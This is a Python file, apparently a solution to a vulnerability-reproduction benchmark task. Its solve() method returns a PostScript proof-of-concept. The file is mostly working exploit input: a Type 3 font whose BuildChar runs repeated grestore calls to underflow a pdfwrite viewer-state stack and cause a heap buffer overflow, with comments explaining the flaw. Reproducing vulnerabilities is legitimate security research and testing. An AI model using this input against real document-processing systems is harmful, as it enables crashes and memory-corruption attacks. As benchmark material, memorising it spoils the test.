import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in pdfwrite.
        
        The vulnerability exists in pdf_viewer_restore_state where it decrements the viewer depth
        and accesses the stack without checking if the depth is at least 1.
        
        To trigger this, we create a PostScript file with a Type 3 font. Inside the BuildChar
        procedure, we execute 'grestore' multiple times. This is valid in the PostScript 
        interpreter (provided we have pushed enough states with 'gsave' beforehand), but it 
        causes the pdfwrite device's internal state stack to underflow because it tracks 
        state changes locally for the PDF generation context.
        """
        
        poc = b"""%!PS
12 dict begin
  /FontType 3 def
  /FontMatrix [1 0 0 1 0 0] def
  /FontBBox [0 0 1 1] def
  /Encoding 256 array def
  0 1 255 {Encoding exch /.notdef put} for
  Encoding 65 /A put
  
  /BuildChar {
    pop pop
    % Initialize cache device (wx wy llx lly urx ury)
    10 0 0 0 10 10 setcachedevice
    
    % The Vulnerability Trigger:
    % pdfwrite tracks the graphics state stack ("viewer state") for PDF output.
    % By calling grestore multiple times here, we pop the state pushed for BuildChar,
    % and then continue popping states. 
    % The vulnerable code blindly decrements the depth counter and accesses the array,
    % leading to a heap buffer overflow or negative index access.
    grestore
    grestore
    grestore
    grestore
    grestore
    
    % Drawing command to complete the char if it didn't crash
    0 0 moveto 10 10 lineto stroke
  } bind def
  
  /FontName /ExploitFont def
  currentdict
end
definefont pop

% Establish a deep graphics state stack so the PostScript interpreter
% does not throw a /stackunderflow error during the multiple grestores.
gsave
gsave
gsave
gsave
gsave
gsave

% Select and use the font to trigger BuildChar
/ExploitFont findfont 20 scalefont setfont
10 10 moveto
(A) show

% Cleanup (unreachable if crash occurs)
grestore
grestore
grestore
grestore
grestore
grestore
"""
        return poc
